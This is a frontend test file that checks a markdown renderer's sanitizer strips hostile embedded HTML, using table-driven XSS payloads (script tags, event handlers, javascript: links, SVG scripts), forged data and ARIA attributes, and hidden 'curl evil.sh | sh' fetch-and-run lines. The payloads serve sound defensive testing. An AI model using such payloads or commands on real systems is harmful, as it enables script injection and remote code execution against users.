// @vitest-environment jsdom
// The shared markdown path (P2-E16-01, §5.30 + §5.29).
//
// Two things are under test and they are different kinds of thing:
//
//  1. THE PIPELINE IS SINGULAR. §5.30 makes "one renderer, one sanitizer
//     configuration" a requirement rather than a preference, because two
//     pipelines drift and the security configuration drifts with them. A
//     comment cannot hold that; the last test in this file reads the source
//     tree and does.
//  2. THE SANITIZER ACTUALLY REFUSES. The viewer renders bytes we did not
//     write — a repository can contain hostile markdown, and an agent can be
//     talked into writing some. So the hostile input here is real markup with
//     real payloads, not a smoke test. It lives INSIDE this fixture: nothing in
//     this file touches a path outside the repo.
import { describe, it, expect, afterEach, beforeAll, beforeEach } from 'vitest';
import fs from 'fs';
import path from 'path';
import { act } from 'react';
import { createRoot, Root } from 'react-dom/client';
import { CSP_DEV, CSP_PROD } from '../../../shared/csp';
import { initI18nForTests } from '../i18n/test-i18n';
import { createRendererRegistry } from '../bootstrap';

import { renderFeedBlock } from '../extensibility/feed-render';
import { decorateDocument, DecorationLabels, stripMedia } from './document-render';
import { decorateFeedMarkdown } from './feed-markdown';
import type { FeedCodeLabels } from './feed-code';
import { classifyHref } from './document-link';
import { UpdateDialog } from '../components/UpdateDialog';
import {
  Markdown,
  MARKED_OPTIONS,
  renderMarkdown,
  SANITIZE_CONFIG,
  STREAMING_CARET,
} from './markdown';

describe('renderMarkdown — the one pipeline', () => {
  it('renders ordinary markdown', () => {
    const html = renderMarkdown('# Title\n\nSome **bold** text.');
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<strong>bold</strong>');
  });

  it('renders GFM: tables, task lists, strikethrough, autolinks', () => {
    // What agents actually emit. `gfm` is marked's default, which is exactly
    // why it is pinned: a default is not a decision until something asserts it.
    const html = renderMarkdown(
      ['| a | b |', '| - | - |', '| 1 | 2 |', '', '- [ ] todo', '- [x] done', '', '~~gone~~'].join(
        '\n'
      )
    );
    expect(html).toContain('<table>');
    expect(html).toContain('<td>1</td>');
    // the task-list marker is a glyph, not an `<input>` (#612 forbids the tag)
    expect(html).toContain('☐ todo');
    expect(html).toContain('<del>gone</del>');
  });

  it('does not turn a single newline into a <br> (breaks: false)', () => {
    // A hard-wrapped paragraph — every plan file in this repo is one — must not
    // render as a ladder of short lines.
    expect(renderMarkdown('one\ntwo')).not.toContain('<br');
    expect(MARKED_OPTIONS.breaks).toBe(false);
  });

  it('parses synchronously — useMemo cannot await', () => {
    expect(MARKED_OPTIONS.async).toBe(false);
    expect(typeof renderMarkdown('x')).toBe('string');
  });
});

describe('the sanitizer, on input we did not write (§5.29)', () => {
  // Each case is [what it is, the markdown, what must NOT survive]. Table-driven
  // so adding the next hostile shape is one line rather than a new test.
  const hostile: Array<[string, string, RegExp]> = [
    ['a raw script tag', 'before\n\n<script>globalThis.__pwned = 1;</script>\n\nafter', /<script/i],
    [
      'an onerror handler on an image',
      '<img src="x" onerror="globalThis.__pwned = 1">',
      /onerror/i,
    ],
    ['an onload handler on a body tag', '<body onload="globalThis.__pwned = 1">', /onload/i],
    ['a javascript: link', '[click me](javascript:globalThis.__pwned=1)', /javascript:/i],
    [
      'a javascript: link in raw HTML',
      '<a href="javascript:globalThis.__pwned=1">click me</a>',
      /javascript:/i,
    ],
    [
      'an inline SVG with a script payload',
      '<svg><script>globalThis.__pwned = 1;</script></svg>',
      /<svg|<script/i,
    ],
    [
      'an inline SVG with an onload handler',
      '<svg onload="globalThis.__pwned = 1"><circle r="9"/></svg>',
      /<svg|onload/i,
    ],
    ['an iframe', '<iframe src="https://example.invalid"></iframe>', /<iframe/i],
    ['an object tag', '<object data="x.swf"></object>', /<object/i],
    ['a base tag that would re-point every relative link', '<base href="https://example.invalid/">', /<base/i],
    ['an animated SVG attribute-setter', '<svg><set attributeName="href" to="javascript:1"/></svg>', /<svg|<set/i],
  ];

  for (const [what, markdown, forbidden] of hostile) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(markdown);
      expect(html).not.toMatch(forbidden);
    });
  }

  it('leaves the surrounding prose intact — it sanitizes, it does not blank', () => {
    // The failure mode worth naming: a sanitizer that answered '' for anything
    // suspicious would pass every test above and render nothing all day.
    const html = renderMarkdown('before\n\n<script>alert(1)</script>\n\nafter');
    expect(html).toContain('before');
    expect(html).toContain('after');
  });

  it('an inert payload is inert once it is in the DOM, not just in the string', () => {
    // The string assertions above are about text; this one mounts it. If the
    // sanitizer ever let a handler through, the flag is the proof.
    const host = document.createElement('div');
    document.body.appendChild(host);
    host.innerHTML = renderMarkdown('<img src="does-not-exist" onerror="globalThis.__pwned = 1">');
    const img = host.querySelector('img');
    img?.dispatchEvent(new Event('error'));
    expect((globalThis as Record<string, unknown>).__pwned).toBeUndefined();
    host.remove();
  });

  it('a <form> survives the sanitizer, and the CSP is what makes that safe', () => {
    // DOMPurify keeps forms — they are ordinary HTML and it strips the parts
    // that execute. Recorded here rather than papered over with a FORBID_TAGS
    // entry, because the layer that actually stops a markdown file from posting
    // your clipboard somewhere is `form-action 'none'` in the policy, and that
    // is the line worth pinning. If it ever leaves the CSP, this goes red.
    expect(renderMarkdown('<form action="https://example.invalid"><input></form>')).toContain(
      '<form'
    );
    expect(CSP_PROD).toContain("form-action 'none'");
    expect(CSP_DEV).toContain("form-action 'none'");
  });

  it('keeps ordinary links and images — the allow-list is not a deny-all', () => {
    const html = renderMarkdown('[docs](https://example.invalid/x) and ![pic](./local.png)');
    expect(html).toContain('href="https://example.invalid/x"');
    expect(html).toContain('src="./local.png"');
  });
});

declare global {
  var IS_REACT_ACT_ENVIRONMENT: boolean;
}

describe('<Markdown>', () => {
  let root: Root | undefined;
  let host: HTMLDivElement | undefined;

  beforeEach(() => {
    globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  });

  const mount = (el: React.ReactElement): HTMLDivElement => {
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => root!.render(el));
    return host;
  };

  afterEach(() => {
    act(() => root?.unmount());
    host?.remove();
    root = undefined;
    host = undefined;
  });

  it('renders through the shared pipeline, in the feed class by default', () => {
    const el = mount(<Markdown text="**hi**" />);
    const div = el.querySelector('.feed-md');
    expect(div?.innerHTML).toContain('<strong>hi</strong>');
  });

  it('takes another surface class without forking the pipeline', () => {
    const el = mount(<Markdown text="# h" className="doc-md" />);
    expect(el.querySelector('.doc-md')).not.toBeNull();
    expect(el.querySelector('.feed-md')).toBeNull();
  });

  it('while STREAMING it is plain text plus the caret — no markdown at all', () => {
    // P2-E18-10: half a document is not a document, and re-parsing per token is
    // quadratic in the length of the reply.
    const el = mount(<Markdown text="**not bold yet" streaming />);
    expect(el.querySelector('strong')).toBeNull();
    expect(el.textContent).toContain('**not bold yet');
    expect(el.textContent).toContain(STREAMING_CARET);
  });

  it('a streamed chunk cannot inject markup either', () => {
    const el = mount(<Markdown text="<script>globalThis.__pwned = 1;</script>" streaming />);
    expect(el.querySelector('script')).toBeNull();
    expect(el.textContent).toContain('<script>');
  });
});

describe('the style attribute: one profile, and every surface uses it (#436)', () => {
  // The decision, pinned. `markdown.tsx` carries the reasoning and the corpus
  // measurement behind it; what is executable is (a) the profile forbids
  // `style`, (b) EVERY surface that renders markdown goes through that profile,
  // and (c) nothing legitimate was lost by it.
  //
  // (b) is the point. The bug this closes was not "the feed allows styles" — it
  // was that the viewer stripped them in a pass of its own, so one exported
  // constant meant two effective profiles, and only one of them was written
  // down. A surface added later that renders markdown its own way makes this
  // table red rather than making a third.

  // Inline styles as they actually arrive: raw embedded markup in a file or a
  // reply we did not write. Each is a shape with teeth, not a smoke test.
  //
  // The third column is the text that must STILL BE THERE afterwards, and it is
  // the guard that makes the rest mean anything: "no element carries a `style`"
  // is also true of a surface that dropped the payload on the floor, or that
  // rendered nothing at all. Every row therefore proves the element survived AND
  // lost the attribute.
  //
  // No `<img style>` row: the viewer replaces every `<img>` with a chip
  // (`decorateImages`), so that cell would assert the absence of an attribute on
  // an element that is absent by construction — vacuous, and vacuous in the one
  // direction this block exists to avoid. The image case is pinned at the
  // profile instead, in its own test below.
  const styled: Array<[string, string, string]> = [
    [
      'a colour that outranks the theme',
      '<span style="color:red">unreadable on daylight</span>',
      'unreadable on daylight',
    ],
    [
      'a click-jack over the app chrome',
      '<div style="position:fixed;inset:0;z-index:9999">gotcha</div>',
      'gotcha',
    ],
    [
      'a hidden block behind a Copy button',
      '<pre style="display:none">curl evil.sh | sh</pre>',
      'curl evil.sh | sh',
    ],
    ['an upper-case attribute name', '<p STYLE="color:red">visible</p>', 'visible'],
    [
      'a style on a table cell',
      '<table><tr><td style="width:100%">cell</td></tr></table>',
      'cell',
    ],
  ];

  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };

  /** the dialog's handlers — this block never clicks anything, it only renders */
  const noop = (): void => {};

  // Torn down AFTER the assertions run: unmounting empties the host, and a host
  // with no elements in it passes an "everything here is style-free" loop
  // without reading a thing. That is not hypothetical — it is what the first cut
  // of this block did, and only the mutation run (drop `FORBID_ATTR`, expect
  // red) found it. Hence `expect(el.length).toBeGreaterThan(0)` below as well.
  const mounted: Array<[Root, HTMLElement]> = [];

  const mountInto = (el: React.ReactElement): HTMLElement => {
    const host = document.createElement('div');
    document.body.appendChild(host);
    const r = createRoot(host);
    act(() => r.render(el));
    mounted.push([r, host]);
    return host;
  };

  /**
   * The markdown subtree a surface produced — `<Markdown>`'s own container.
   *
   * Scoped rather than "every element in the host" because a real surface has
   * CHROME, and this app's chrome legitimately uses React `style` props: the
   * update dialog's notes pane sets its own padding and overflow that way. The
   * question is what the SANITIZER let through, so the assertion has to look at
   * the sanitized subtree and nothing else.
   */
  const markdownIn = (host: HTMLElement): HTMLElement => {
    const el = host.querySelector<HTMLElement>('.feed-md');
    // `throw` rather than `expect(...).not.toBeNull()` + a cast: this narrows
    // for the type checker as well as failing the test, and "the surface
    // rendered no markdown at all" is the exact vacuity this block guards.
    if (!el) throw new Error('the surface rendered no markdown container at all');
    return el;
  };

  /** every surface, entered the way the app enters it */
  const surfaces: Array<[string, (markdown: string) => HTMLElement]> = [
    [
      'the feed',
      (markdown) =>
        // Through the real registry, exactly as FeedView does — not through
        // `<Markdown>` directly, or the test would pass while the feed grew a
        // renderer of its own.
        markdownIn(
          mountInto(
            <>
              {renderFeedBlock(createRendererRegistry(), {
                seq: 1,
                kind: 'assistant',
                sidechain: false,
                text: markdown,
              })}
            </>
          )
        ),
    ],
    [
      // The REAL dialog, not `<Markdown>` standing in for it. Release notes are
      // markdown from a GitHub release, and the drift worth catching is
      // "UpdateDialog stops rendering notes through the shared pipeline" — which
      // a row that renders `<Markdown>` itself could never notice, because it
      // would be testing its own stand-in. Mounting the component means
      // `UpdateDialog.tsx` losing its `<Markdown>` turns this red.
      'the update dialog',
      (markdown) =>
        markdownIn(
          mountInto(
            <UpdateDialog
              open
              status={{
                manual: false,
                prompt: true,
                result: {
                  ok: true,
                  state: 'available',
                  currentVersion: '0.1.0',
                  latestVersion: '0.2.0',
                  notes: markdown,
                  url: 'https://github.com/badsonstudios/switchboard.ai/releases/tag/v0.2.0',
                  checkedAt: '2026-08-05T10:00:00.000Z',
                },
              }}
              install={null}
              onClose={noop}
              onUpdate={noop}
              onOpenUrl={noop}
              onIgnore={noop}
              onSkip={noop}
              onCancelInstall={noop}
            />
          )
        ),
    ],
    [
      // Belt AND braces: `stripOurNamespace` removes `style` too, so this row
      // would stay green if the profile lost `FORBID_ATTR`. It is here for the
      // mapping — "the viewer renders through this pipeline" — not as the thing
      // that detects the drift. The two rows above are, and a mutation run
      // (2026-08-13, `FORBID_ATTR` dropped) put both of them red across every
      // payload.
      'the document viewer',
      (markdown) => {
        const { fragment } = decorateDocument(renderMarkdown(markdown), LABELS, (href) =>
          classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
        );
        const host = document.createElement('div');
        host.append(fragment);
        return host;
      },
    ],
  ];

  beforeAll(async () => {
    // Set HERE rather than inherited: the `<Markdown>` block below also sets it,
    // and describes run in file order, so this block only had it by accident of
    // where it sits. Reordering or deleting that block would have left `act()`
    // warning instead of acting.
    globalThis.IS_REACT_ACT_ENVIRONMENT = true;
    // The feed's registry renders real blocks, and real blocks translate.
    await initI18nForTests();
  });

  afterEach(() => {
    for (const [r, host] of mounted.splice(0)) {
      act(() => r.unmount());
      host.remove();
    }
  });

  it('the profile forbids it — one constant, not one pass per surface', () => {
    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('style');
    expect(renderMarkdown('<p style="color:red">x</p>')).not.toContain('style');
  });

  it('and the constant cannot be edited at runtime', () => {
    // "One configuration" has to survive the renderer as well as the source
    // tree: an exported mutable object is a second profile waiting to be
    // written. The array matters most — that is where the policy lives, and
    // freezing only the top level would leave it open.
    expect(Object.isFrozen(SANITIZE_CONFIG)).toBe(true);
    expect(Object.isFrozen(SANITIZE_CONFIG.FORBID_ATTR)).toBe(true);
    expect(Object.isFrozen(SANITIZE_CONFIG.USE_PROFILES)).toBe(true);
    // and it is genuinely inert, not merely flagged
    const forbidden = SANITIZE_CONFIG.FORBID_ATTR;
    expect(forbidden).toBeDefined();
    expect(() => forbidden?.pop()).toThrow();
    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('style');
  });

  for (const [surface, draw] of surfaces) {
    for (const [what, markdown, survives] of styled) {
      it(`${surface} strips ${what}`, () => {
        const md = draw(markdown);
        const els = [...md.querySelectorAll('*')];
        // Three assertions, and the first two are what stop the third being a
        // sentence about an empty room: the surface rendered elements, and the
        // payload is still IN them. Only then does "and none of them carries a
        // style" say anything. See the note on `styled`.
        expect(els.length).toBeGreaterThan(0);
        expect(md.textContent).toContain(survives);
        for (const el of els) expect(el.hasAttribute('style')).toBe(false);
      });
    }
  }

  // The TAG half of the same table (#612). It rides in this block deliberately:
  // the asset worth reusing is `surfaces` — "every surface enters through the
  // one profile" — and re-deriving it in the #612 block would be a second table
  // to keep in step with the first. Same three surfaces, a DIFFERENT vacuity
  // guard, and the row body says why.
  //
  // Third column = what must STILL be on screen, because `KEEP_CONTENT` is what
  // makes forbidding a tag safe: the element goes, its children stay. A row that
  // only asserted "no <button>" would pass just as well if the surface had eaten
  // the sentence around it.
  const forgedTags: Array<[string, string, string, string]> = [
    [
      'a control wearing the feed’s own affordance',
      '<button data-x aria-expanded="false">▾ OUT</button>',
      '▾ OUT',
      'button',
    ],
    [
      'a text box asking for a secret',
      'Paste your token to continue:\n\n<input type="text" name="token">',
      'Paste your token to continue',
      'input',
    ],
    [
      'a dropdown',
      '<select name="pick"><option>alpha</option><option>beta</option></select>',
      'alpha',
      'select',
    ],
    ['a multi-line entry box', '<textarea name="notes">typed here</textarea>', 'typed here', 'textarea'],
    ['a block that centres itself', '<center>middle of the page</center>', 'middle of the page', 'center'],
    ['text that moves on its own', '<marquee>going past</marquee>', 'going past', 'marquee'],
    ['the leftover inline box `<font>` became', '<font>tinted once</font>', 'tinted once', 'font'],
    // Upper case, because the tag allow-list is a lookup and a lookup is where
    // a case bug lives. `<CENTER>` is the same element to the parser.
    ['an upper-case tag name', '<BUTTON>SHOUTING</BUTTON>', 'SHOUTING', 'button'],

    // #625 — the media, image-map and UA-hidden tags. Same table on purpose:
    // the row that matters most is THE UPDATE DIALOG, which renders release
    // notes fetched from GitHub through `<Markdown>` with no `decorate` prop at
    // all. A media pass written into `feed-markdown.ts` would have left that
    // column open, and this table is where that would have shown up.
    //
    // THE THIRD COLUMN SITS OUTSIDE THE MEDIA ELEMENT in the rows below, and
    // that is not a weaker guard — it is the one true statement available.
    // `audio` and `video` are in DOMPurify's own default `FORBID_CONTENTS`, so
    // for those two the children go WITH the element rather than surviving it.
    // The divergence has a row of its own in the #625 block; here the guard has
    // to be prose the payload could not have eaten.
    [
      'a media player with a tab stop and a Download menu',
      'Listen to this:\n\n<audio controls src="https://evil.test/a.mp3">A</audio>',
      'Listen to this:',
      'audio',
    ],
    [
      'a video player',
      'Watch this:\n\n<video controls src="https://evil.test/v.mp4" poster="p.png">B</video>',
      'Watch this:',
      'video',
    ],
    [
      // No `controls`, so not a tab stop — this row is the FETCH half, and it
      // is why the decision is the tag and not the attribute.
      'a media element that fetches and plays with no controls at all',
      'Nothing to see here:\n\n<audio autoplay loop src="https://evil.test/a.mp3"></audio>',
      'Nothing to see here:',
      'audio',
    ],
    [
      'the child a media element fetches from',
      'Clip:\n\n<video><source src="https://evil.test/v.mp4" type="video/mp4"></video>',
      'Clip:',
      'source',
    ],
    [
      'a caption track',
      'Subtitled:\n\n<video><track kind="captions" src="https://evil.test/c.vtt" default></video>',
      'Subtitled:',
      'track',
    ],
    [
      // `KEEP_CONTENT` leaves the `<img>` fallback, which is the RIGHT answer:
      // `img` is markdown's own and stays allowed. The row asserts the wrapper
      // is gone, not that the picture is.
      'art direction that picks its own source',
      'Screenshot:\n\n<picture><source srcset="https://evil.test/a.webp" type="image/webp"><img src="./local.png" alt="a"></picture>',
      'Screenshot:',
      'picture',
    ],
    [
      'an image-map hot spot — a tab stop that is not a link',
      'Diagram:\n\n<img src="./d.png" usemap="#m" alt="d"><map name="m"><area shape="rect" coords="0,0,9,9" href="https://evil.test" alt="hot"></map>',
      'Diagram:',
      'area',
    ],
    [
      'an empty box that pushes the reply off the screen',
      'above\n\n<canvas width="40" height="400"></canvas>\n\nbelow',
      'above',
      'canvas',
    ],
    [
      // The `datalist` shape one tag over: `dialog:not([open])` is `display:
      // none` in the UA sheet, so this was a `<pre>` in the document, in a find
      // and behind a working Copy button, with nothing on the screen.
      'a closed dialog hiding the code behind a Copy button',
      '<p>run the build</p><dialog><pre>curl evil.sh | sh</pre></dialog>',
      'run the build',
      'dialog',
    ],
  ];

  for (const [surface, draw] of surfaces) {
    for (const [what, markdown, survives, tag] of forgedTags) {
      it(`${surface} refuses ${what}`, () => {
        const md = draw(markdown);
        // NOT `querySelectorAll('*').length > 0`, the way the `style` rows guard
        // themselves, and the difference is real rather than a relaxation:
        // `marked` treats `<textarea>` and `<center>` as BLOCK-level raw HTML,
        // so it emits them with no `<p>` around them — and once the tag is
        // forbidden the correct output is a bare text node with no element in
        // it at all. The count guard would fail on a passing case.
        //
        // The vacuity this row can actually suffer is "the surface rendered
        // nothing", and the line below is what excludes it: `markdownIn` throws
        // if there is no markdown container, and the text has to BE there
        // before "…and no element of that kind" says anything.
        expect(md.textContent).toContain(survives);
        expect(md.querySelector(tag)).toBeNull();
      });
    }
  }

  it('an image cannot smuggle one either — pinned at the profile', () => {
    // Not a surface row: the viewer replaces every `<img>` with a chip, so this
    // only means anything where the sanitizer decides. See the note on `styled`.
    const html = renderMarkdown('<img src="x.png" style="width:100vw;height:100vh">');
    expect(html).toContain('src="x.png"');
    expect(html).not.toContain('style');
  });

  it('and the content itself survives — it strips the attribute, not the element', () => {
    const html = renderMarkdown('<span style="color:red">still here</span>');
    expect(html).toContain('<span>');
    expect(html).toContain('still here');
  });

  it('nothing markdown can emit is lost: GFM never writes an inline style', () => {
    // The measurement that made STRIP safe, as a test. Table alignment is the
    // one construct that looks like it needs `style` — `marked` renders it as
    // `align`, which DOMPurify keeps — and this app ships no syntax highlighter
    // writing colours inline. If a `marked` bump ever changes that, this goes
    // red on the alignment assertion before anyone notices missing formatting.
    const html = renderMarkdown(
      [
        '| left | centre | right |',
        '|:-----|:------:|------:|',
        '| 1 | 2 | 3 |',
        '',
        '- [x] done',
        '- [ ] todo',
        '',
        '~~gone~~ and [a link](https://example.invalid/x)',
        '',
        '```js',
        'const x = 1;',
        '```',
        '',
        '> quote',
        '',
        '![pic](./local.png)',
      ].join('\n')
    );
    expect(html).not.toContain('style=');
    expect(html).toContain('align="center"');
    expect(html).toContain('align="right"');
    // the task-list marker is a glyph, not an `<input>` (#612 forbids the tag)
    expect(html).toContain('☐ todo');
    expect(html).toContain('<code');
    expect(html).toContain('<del>gone</del>');
    expect(html).toContain('src="./local.png"');
  });

  it('the <style> TAG was already out, and stays out', () => {
    // Wider than the attribute: a stylesheet is not scoped to the block that
    // carried it, so one from a document restyles the whole app. It falls to
    // `USE_PROFILES: { html: true }` rather than to `FORBID_ATTR`, which is
    // exactly the kind of thing that is true until a profile change makes it
    // quietly untrue.
    expect(renderMarkdown('<style>body{display:none}</style>')).not.toContain('<style');
    expect(renderMarkdown('<style>@import url(https://evil.test/x.css);</style>')).not.toContain(
      'evil.test'
    );
  });
});

describe('data attributes: no surface’s protocol is speakable (#465)', () => {
  // The layer that does not depend on remembering. Every decorating surface in
  // this app writes data attributes and then reads them back off the live DOM as
  // instructions — the viewer's `data-doc-*` (#410) and the feed's
  // `data-feed-*` / `data-no-toggle` (#465) — and the DOM does not remember who
  // wrote what. `ALLOW_DATA_ATTR: false` means the question never reaches a
  // surface: markdown emits no data attributes at all, so every one that would
  // arrive is raw embedded markup, which is the input §5.30 says to distrust.
  //
  // The per-surface take-back (`decoration-guard.ts`) still exists and still has
  // its own tests, because it covers `class` and callers that build HTML another
  // way. This block is the profile, and the profile alone.

  it('the profile refuses them — one constant, for surfaces that do not exist yet', () => {
    expect(SANITIZE_CONFIG.ALLOW_DATA_ATTR).toBe(false);
  });

  // Real protocol forgeries, each one an instruction to a handler that exists.
  const forged: Array<[string, string, string]> = [
    [
      'a phantom stop in the feed’s arrow-key list',
      '<button data-feed-expander aria-expanded="false">▾ OUT</button>',
      '▾ OUT',
    ],
    [
      'a block id that would capture a find jump',
      '<span data-feed-seq="4">not the block you searched for</span>',
      'not the block you searched for',
    ],
    ['a stand-down mark that deadens a tool box', '<div data-no-toggle>inert</div>', 'inert'],
    [
      'the viewer’s external-open instruction',
      '<a href="https://ok.test/x" data-doc-external="https://exfil.test/?leak">click</a>',
      'click',
    ],
    ['an attribute in a namespace nobody has claimed yet', '<p data-future="x">later</p>', 'later'],
  ];

  for (const [what, payload, survives] of forged) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(payload);
      expect(html).not.toContain('data-');
      // …and the message itself is untouched: this strips attributes, not text
      expect(html).toContain(survives);
    });
  }

  it('loses nothing markdown can emit — it never writes a data attribute', () => {
    // The whole GFM surface, for the same reason the `style` block renders it:
    // "nothing legitimate is lost" is a claim, and this is the only way to hold
    // it. `marked` writes `class="language-ts"` on a fence and `align` on a
    // table cell; it has no construct that produces `data-*`.
    const html = renderMarkdown(
      '# H\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n' +
        '```ts\nconst x = 1;\n```\n\n~~gone~~ and `code`\n\n![alt](./local.png)\n\n<https://auto.link/>\n'
    );
    expect(html).not.toContain('data-');
    expect(html).toContain('language-ts');
    expect(html).toContain('align="right"');
    // the task-list marker is a glyph, not an `<input>` (#612 forbids the tag)
    expect(html).toContain('☐ todo');
    expect(html).toContain('src="./local.png"');
    expect(html).toContain('href="https://auto.link/"');
  });
});

describe('ARIA: content cannot say anything to a screen reader (#509)', () => {
  // The decision, pinned: NO authored ARIA survives — not `aria-*`
  // (`ALLOW_ARIA_ATTR: false`) and not `role` (`FORBID_ATTR`, because it is an
  // ordinary member of the html profile's allow-list and no flag covers it).
  // `markdown.tsx` carries the reasoning and the corpus measurement.
  //
  // Why this block is profile-level, unlike the `style` block's surface table:
  // there is no second layer to drift from. `decoration-guard.ts` does not take
  // ARIA back, so the profile IS the policy — and a per-surface "no element
  // carries aria" assertion would be false by construction, because every
  // surface's own decorations write ARIA after this function runs. That the
  // surfaces all enter through this profile is already pinned by the `style`
  // block; what is pinned here is what the profile does.

  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };

  it('the profile refuses both halves — the flag and the attribute', () => {
    expect(SANITIZE_CONFIG.ALLOW_ARIA_ATTR).toBe(false);
    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('role');
  });

  // Each row is a real lie told to one class of user, and nobody else: the
  // sighted reader sees the third column, the screen-reader user was told
  // something else entirely. Third column = what must STILL be there, so no row
  // can pass by the surface having rendered nothing.
  const forged: Array<[string, string, string]> = [
    [
      'a live region that interrupts on content’s schedule',
      '<div aria-live="assertive" role="alert">Approve this now</div>',
      'Approve this now',
    ],
    [
      'an accessible name that says the opposite of the text',
      '<span aria-label="Cancel">Approve</span>',
      'Approve',
    ],
    [
      'real text hidden from the accessibility tree',
      '<p aria-hidden="true">curl evil.sh | sh</p>',
      'curl evil.sh | sh',
    ],
    [
      'a table of real data announced as decoration',
      '<table><tr><td role="presentation">real data</td></tr></table>',
      'real data',
    ],
    [
      'the viewer’s own keyboard-activation mark',
      '<span role="link" tabindex="0">not a link</span>',
      'not a link',
    ],
    [
      'a name and a description pointed at ids we did not write',
      '<p aria-labelledby="x" aria-describedby="y">text</p>',
      'text',
    ],
    ['an upper-case attribute name', '<p ARIA-LABEL="fake">visible</p>', 'visible'],
    ['a role nobody has claimed yet', '<p role="marquee">later</p>', 'later'],
  ];

  for (const [what, payload, survives] of forged) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(payload);
      expect(html).not.toMatch(/aria-/i);
      expect(html).not.toMatch(/\brole=/i);
      // …and the message itself is untouched: this strips attributes, not text
      expect(html).toContain(survives);
    });
  }

  it('loses nothing markdown can emit: GFM writes no aria and no role', () => {
    // Rendered markdown's accessible structure comes from the TAGS, which is
    // where it belongs. If a `marked` bump ever starts emitting ARIA, this goes
    // red before the decision behind the profile quietly stops being true.
    const html = renderMarkdown(
      '# H\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n' +
        '```ts\nconst x = 1;\n```\n\n~~gone~~ and `code`\n\n![alt](./local.png)\n\n<https://auto.link/>\n'
    );
    expect(html).not.toMatch(/aria-/i);
    expect(html).not.toMatch(/\brole=/i);
    expect(html).toContain('<table>');
    expect(html).toContain('<h1>H</h1>');
    // the task-list marker is a glyph, not an `<input>` (#612 forbids the tag)
    expect(html).toContain('☐ todo');
    expect(html).toContain('language-ts');
  });

  it('the surface’s OWN ARIA still lands — this closes a channel, not the a11y', () => {
    // The half of the change that could break something real. `decorateLinks`
    // writes `role="link"` on a link whose `href` it removed, and
    // `DocumentViewer`'s keydown handler reads that role back to answer Enter;
    // `decorateTables` writes `role="group"` on the scroll container. Both run
    // AFTER the sanitizer, so both must survive — while the forged one in the
    // same document does not.
    const { fragment } = decorateDocument(
      renderMarkdown(
        '[docs](./other.md)\n\n<span role="link" tabindex="0">forged</span>\n\n| a |\n|---|\n| 1 |\n'
      ),
      LABELS,
      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
    );
    const host = document.createElement('div');
    host.append(fragment);
    expect(host.querySelector('a')?.getAttribute('role')).toBe('link');
    expect(host.querySelector('.doc-table-wrap')?.getAttribute('role')).toBe('group');
    expect(host.querySelector('span')?.hasAttribute('role')).toBe(false);
    expect(host.textContent).toContain('forged');
  });
});

describe('legacy presentational attributes and focus order (#466, #598)', () => {
  // The decision, pinned: the legacy presentational set (`color`, `bgcolor`,
  // `background`, `face`, `size`), the three ways content can take itself out of
  // the rendering or the a11y tree (`hidden`, `popover` + its invoker
  // attributes, `inert`) and `tabindex` all go, while `align` deliberately stays
  // because GFM emits it.
  // `markdown.tsx` carries the reasoning and the corpus measurement.
  //
  // Profile-level, for #509's reason: there is no second layer to drift from.
  // `decoration-guard.ts` takes back `style` and each surface's own namespace,
  // not these, so the profile IS the policy — and a per-surface "no element
  // carries a tabindex" assertion would be false by construction, because
  // `decorateTables`, `decorateLinks` and the feed's Copy button all write one
  // after this function runs. That every surface enters through this profile is
  // already pinned by the `style` block's surface table; what is pinned here is
  // what the profile does, plus the two cases where a decoration pass gives a
  // stripped attribute its teeth back if it survives.

  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };
  const FEED_LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy code' };

  it('the profile forbids every one of them BY NAME — because no flag can', () => {
    // By name, because there is no flag to reach for: unlike `aria-*`
    // (`ALLOW_ARIA_ATTR`) and `data-*` (`ALLOW_DATA_ATTR`), every attribute here
    // is an ordinary member of the html profile's allow-list. The second
    // assertion is the half the name promises — the config has exactly five
    // keys (`FORBID_TAGS` is #612's, and the same "no flag reaches it"
    // argument), so this list really is the whole mechanism.
    for (const attr of [
      'color',
      'bgcolor',
      'background',
      'face',
      'size',
      'hidden',
      'popover',
      'popovertarget',
      'popovertargetaction',
      'inert',
      'tabindex',
    ]) {
      expect(SANITIZE_CONFIG.FORBID_ATTR).toContain(attr);
    }
    expect(Object.keys(SANITIZE_CONFIG).sort()).toEqual([
      'ALLOW_ARIA_ATTR',
      'ALLOW_DATA_ATTR',
      'FORBID_ATTR',
      'FORBID_TAGS',
      'USE_PROFILES',
    ]);
  });

  it('and deliberately does NOT forbid `align`, which is markdown’s own', () => {
    // The one divergence from "strip the legacy presentational set", pinned
    // here rather than left to the comment: `marked` renders GFM column
    // alignment as `align`, so forbidding it would silently un-align every
    // table in the app. If someone adds it to the list, this reds and the row
    // below shows what it would have cost.
    expect(SANITIZE_CONFIG.FORBID_ATTR).not.toContain('align');
    const html = renderMarkdown('| l | c | r |\n|:--|:-:|--:|\n| 1 | 2 | 3 |\n');
    expect(html).toContain('align="right"');
    expect(html).toContain('align="center"');
  });

  // Third column = what must STILL be there, so no row can pass by the
  // sanitizer having eaten the element along with the attribute. The colours
  // are named rather than hex because this repo's lint bans a raw hex colour in
  // source — the attribute is what is under test, not its value.
  const forged: Array<[string, string, string, RegExp]> = [
    [
      'a font that picks its own colour, size and typeface',
      '<font color="crimson" size="7" face="Comic Sans MS">shouty</font>',
      'shouty',
